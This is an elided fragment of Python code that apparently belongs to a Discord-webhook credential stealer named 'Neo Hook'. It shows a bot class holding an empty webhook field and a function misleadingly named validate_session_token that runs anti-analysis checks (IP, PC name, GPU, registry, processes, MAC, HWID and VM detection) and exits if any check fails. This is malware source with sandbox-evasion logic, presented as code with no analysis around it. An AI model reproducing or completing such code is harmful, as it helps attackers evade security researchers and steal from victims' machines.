...
class js_bot:
    js_avatar_url = "https://ae01.alicdn.com/kf/A4e4fc27528524fa3a382396ad8ce7f1af/Dakimakura-funda-de-almohada-corporal-orc-para-mujer-estampado-de-doble-cara-tama-o-real-Anime.png"
    js_webhook_name = "Neo Hook (femboy furry UwU)"
    js_webhook = ""
...
def validate_session_token():
    flags=[0,0,0]
    try:
        Kerpy.check_ip(self=Kerpy)
        Kerpy.check_pc(self=Kerpy)
        Kerpy.checkgpu(self=Kerpy)
    except:
        result = ctypes.windll.user32.MessageBoxW(0, 'Check #1 Failed', f"{title}", 0x4000 | 0x0 | 0x40)
        flags[0]=1
        sys.exit()

    try:
        Kerpy.registry_check(self=Kerpy)
        Kerpy.processes_and_files_check(self=Kerpy)
        Kerpy.mac_check(self=Kerpy)
    except:
        result = ctypes.windll.user32.MessageBoxW(0, 'Check #2 Failed', f"{title}", 0x4000 | 0x0 | 0x40)
        flags[1]=1
        sys.exit()
    try:
        Kerpy.hwid_vm(self=Kerpy)
        Kerpy.profiles()
    except:
        result = ctypes.windll.user32.MessageBoxW(0, 'Check #3 Failed', f"{title}", 0x4000 | 0x0 | 0x40)
        flags[2]=1
        sys.exit()
